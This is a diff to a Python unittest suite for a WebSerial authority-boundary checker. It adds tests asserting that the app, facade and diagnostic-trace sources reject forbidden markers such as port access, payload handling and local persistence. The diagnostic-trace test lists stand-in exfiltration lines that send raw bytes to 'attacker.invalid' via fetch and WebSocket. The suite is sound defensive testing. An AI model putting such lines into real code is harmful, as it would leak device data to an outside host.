@@ -62,6 +62,11 @@ class WebSerialAuthorityPolicyTests(unittest.TestCase):
         for required in (
             check_webserial_boundary.ADAPTER,
             check_webserial_boundary.DECLARATION,
+            check_webserial_boundary.FACADE,
+            check_webserial_boundary.FACADE_DECLARATION,
+            check_webserial_boundary.DIAGNOSTIC_TRACE,
+            check_webserial_boundary.DIAGNOSTIC_TRACE_DECLARATION,
+            check_webserial_boundary.APP,
         ):
             sources = copy.deepcopy(self.sources)
             del sources[required]
@@ -106,8 +111,8 @@ class WebSerialAuthorityPolicyTests(unittest.TestCase):
 
         sources = copy.deepcopy(self.sources)
         sources[adapter] = sources[adapter].replace(
-            "const discovery = new WasmReadonlySerialDiscovery();",
-            "const discovery = this.discoveryFactory();",
+            "discovery = new WasmReadonlySerialDiscovery();",
+            "discovery = this.discoveryFactory();",
         )
         self.assertTrue(check_webserial_boundary.source_authority_errors(sources))
 
@@ -140,6 +145,61 @@ class WebSerialAuthorityPolicyTests(unittest.TestCase):
             "validator: Function",
         ):
             self.rejected(str(declaration), marker)
+
+    def test_react_cannot_gain_command_payload_permission_or_persistence(self) -> None:
+        for marker in (
+            "navigator.serial.requestPort()",
+            "getPorts()",
+            "getInfo()",
+            "const commandId = 1;",
+            "const payload = bytes;",
+            "WriteApproval",
+            "TransportEffect",
+            "localStorage.setItem('device', value)",
+            "const hardwareObserved = true;",
+            "const boardSignature = value;",
+            "const UID = value;",
+            "const rawPayload = bytes;",
+        ):
+            self.rejected(str(check_webserial_boundary.APP), marker)
+
+    def test_facade_cannot_replace_host_or_gain_low_level_authority(self) -> None:
+        for marker in (
+            "navigator.serial.requestPort()",
+            "getPorts()",
+            "getInfo()",
+            "const commandId = 1;",
+            "const payload = bytes;",
+            "WriteApproval",
+            "TransportEffect",
+            "localStorage.setItem('device', value)",
+        ):
+            self.rejected(str(check_webserial_boundary.FACADE), marker)
+
+    def test_diagnostic_trace_cannot_gain_raw_data_or_an_outbound_sink(self) -> None:
+        diagnostic = str(check_webserial_boundary.DIAGNOSTIC_TRACE)
+        for marker in (
+            "console.log(candidate);",
+            "localStorage.setItem('trace', value);",
+            "indexedDB.open('trace');",
+            "fetch('https://attacker.invalid', { body: rawBytes });",
+            "new WebSocket('wss://attacker.invalid');",
+            "const rawFrame = candidate.payload;",
+            "const usbVendorId = port.getInfo().usbVendorId;",
+            "const serialNumber = device.serialNumber;",
+        ):
+            self.rejected(diagnostic, marker)
+
+    def test_diagnostic_capacity_and_fixed_field_gate_cannot_be_removed(self) -> None:
+        for marker in (
+            "DIAGNOSTIC_TRACE_CAPACITY = 200",
+            "capacity < 100 || capacity > 250",
+            "ALLOWED_KEYS",
+        ):
+            sources = copy.deepcopy(self.sources)
+            diagnostic = check_webserial_boundary.DIAGNOSTIC_TRACE
+            sources[diagnostic] = sources[diagnostic].replace(marker, "REMOVED_BOUNDARY")
+            self.assertTrue(check_webserial_boundary.source_authority_errors(sources))
 
 
 if __name__ == "__main__":
